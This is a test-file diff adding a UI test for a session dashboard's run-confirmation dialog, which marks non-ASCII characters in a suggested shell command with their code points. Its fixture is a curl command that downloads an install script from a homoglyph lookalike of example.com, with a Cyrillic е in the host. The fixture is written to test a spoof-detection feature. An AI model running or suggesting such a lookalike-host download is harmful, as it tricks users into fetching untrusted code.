@@ -634,6 +634,33 @@ describe("page: a quiet desk and its redraws", SKIP, () => {
       }
     });
 
+    it("marks in the confirmation each character of the command outside ASCII with its code, the command itself unchanged", async () => {
+      const own = procInfo(process.pid);
+      assert.ok(own?.start);
+      // A Cyrillic е (U+0435) in the host, which reads as a Latin e, and an é.
+      const run = "! curl -fsSL https://еxample.com/install.sh -o /tmp/café.sh";
+      const at = new Date().toISOString();
+      store.upsertSession({ id: "asks-run-marks", provider: "Test", project: { name: "web-shop", dir: "/home/demo/Projects/web-shop" }, title: "asks to run a lookalike", state: "waiting", lastMessage: { text: `\`\`\`\n${run}\n\`\`\``, at }, shellSuggestion: { text: run, at }, process: { pid: process.pid, start: own.start, ancestors: [] }, tmux: { socket: "/tmp/tmux-1000/default", pane: "%1", clients: [] } });
+      try {
+        const page = await open();
+        await page.eval("location.hash = '#s=asks-run-marks'");
+        await page.waitFor(`${arrived("session")} && document.querySelector('#session .shell-run [data-key=shell]')`);
+        assert.equal(await page.eval<number>("document.querySelectorAll('#session .shell-run .shell-cp').length"), 0, "only the confirmation marks them");
+        await page.click("#session .shell-run [data-key=shell]", "Run in its terminal");
+        const cmd = "document.querySelector('#session .shell-run.confirming .shell-cmd')";
+        await page.waitFor(cmd);
+        assert.equal(await page.eval<string>(`${cmd}.textContent`), run, "the command as it is typed");
+        assert.deepEqual(
+          await page.eval<string[][]>(`[...${cmd}.querySelectorAll('mark.shell-cp')].map((m) => [m.textContent, getComputedStyle(m, '::after').content])`),
+          [["е", '" U+0435"'], ["é", '" U+00E9"']],
+          "each one followed by its code",
+        );
+        assert.match(await page.eval<string>("document.querySelector('#session .shell-run.confirming .shell-ask').textContent"), /Each character outside ASCII shows its code after it: some look like others\.$/);
+      } finally {
+        store.updateSession("asks-run-marks", (s) => ({ ...s, state: "ended" }));
+      }
+    });
+
     it("shows on the /compact button the start of the instructions the session suggested, as plain text, and disarms it when they change", async () => {
       const own = procInfo(process.pid);
       assert.ok(own?.start);
